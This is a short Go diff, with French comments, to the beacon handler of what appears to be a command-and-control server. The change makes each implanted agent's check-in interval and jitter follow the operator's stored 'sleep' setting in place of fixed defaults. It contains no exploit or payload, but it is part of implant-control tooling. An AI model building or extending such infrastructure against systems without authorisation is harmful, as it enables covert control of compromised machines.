@@ -309,7 +309,16 @@ func (l *HTTPSListener) handleBeacon(c *gin.Context) {
 			len(tasks), beacon.Username, beacon.Hostname)
 	}
 
-	// Construire la réponse
+	// Construire la réponse — utiliser le BeaconInt actuel de l'agent en DB
+	// (mis à jour par la commande "sleep N" via UpdateTaskResult/change_sleep)
+	agentInfo, _ := l.DB.GetAgent(envelope.AgentID)
+	sleepTime := models.DefaultBeaconInterval
+	jitter := models.DefaultJitter
+	if agentInfo != nil && agentInfo.BeaconInt > 0 {
+		sleepTime = agentInfo.BeaconInt
+		jitter = agentInfo.Jitter
+	}
+
 	taskSlice := make([]models.Task, len(tasks))
 	for i, t := range tasks {
 		taskSlice[i] = *t
@@ -317,8 +326,8 @@ func (l *HTTPSListener) handleBeacon(c *gin.Context) {
 
 	response := models.BeaconResponse{
 		Tasks:     taskSlice,
-		SleepTime: models.DefaultBeaconInterval,
-		Jitter:    models.DefaultJitter,
+		SleepTime: sleepTime,
+		Jitter:    jitter,
 		Kill:      false,
 	}
 
